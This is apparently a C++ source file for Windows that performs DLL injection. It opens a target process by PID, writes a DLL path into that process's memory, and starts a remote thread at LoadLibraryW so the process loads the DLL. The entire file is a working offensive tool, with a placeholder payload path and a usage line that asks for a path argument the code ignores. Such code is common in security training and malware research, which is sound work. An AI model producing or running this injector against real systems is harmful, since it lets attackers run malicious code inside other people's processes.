#include <iostream>
#include <windows.h>

const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HMODULE hKernel32 = NULL;
HANDLE hProcess, hThread = NULL;

//hardcoded path to the DLL for example purposes
wchar_t dllPath[MAX_PATH] = L"PAYLOADDLLPATH";
size_t dllPathSize = sizeof(dllPath);

int main(int argc, char* argv[])
{
	//If the user doesn't provide a PID, print the usage
	if (argc < 2)
	{
		printf("%s Usage: %s <PID> <DLL_PATH>\n", i, argv[0]);
		return 1;
	}

	//Get a handle to the process
	PID = atoi(argv[1]);
	printf("%s Trying to get a handle to the process (%ld)\n", i, PID);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (hProcess == NULL)
	{
		printf("%s Failed to get a handle to the process (%ld)\n", e, PID);
		return 1;
	}
	printf("%s Successfully got a handle (0x%p)\n", k, hProcess);

	//Allocate memory in the process
	printf("%s Trying to allocate memory in the process\n", i);
	rBuffer = VirtualAllocEx(hProcess, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (rBuffer == NULL)
	{
		printf("%s Failed to allocate memory in the process\n", e);
		return 1;
	}
	printf("%s Successfully allocated memory (0x%p)\n", k, rBuffer);

	//Write the memory to the process
	printf("%s Trying to write the DLL path to the process\n", i);
	WriteProcessMemory(hProcess, rBuffer, dllPath, dllPathSize, NULL);

	//Get handle to kernel32.dll
	hKernel32 = GetModuleHandle(L"kernel32.dll");
	if (hKernel32 == NULL)
	{
		printf("%s Failed to get a handle to kernel32.dll\n", e);
		return 1;
	}

	printf("%s Successfully got a handle to kernel32.dll (0x%p)\n", k, hKernel32);

	//Get the address of LoadLibraryW
	//LPTHREAD_START_ROUTINE tells the thread where to start executing
	LPTHREAD_START_ROUTINE lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
	printf("%s Successfully got the address of LoadLibraryW (0x%p)\n", k, lpStartAddress);

	//Create a new thread in the process
	hThread = CreateRemoteThread(hProcess, NULL, 0, lpStartAddress, rBuffer, 0, &TID);
	if (hThread == NULL)
	{
		printf("%s Failed to create a remote thread\n", e);
		return 1;
	}

	printf("%s Successfully created a remote thread (0x%p)\n", k, hThread);
	WaitForSingleObject(hThread, INFINITE);
	printf("%s Successfully injected the DLL\n", k);
	return 0;
}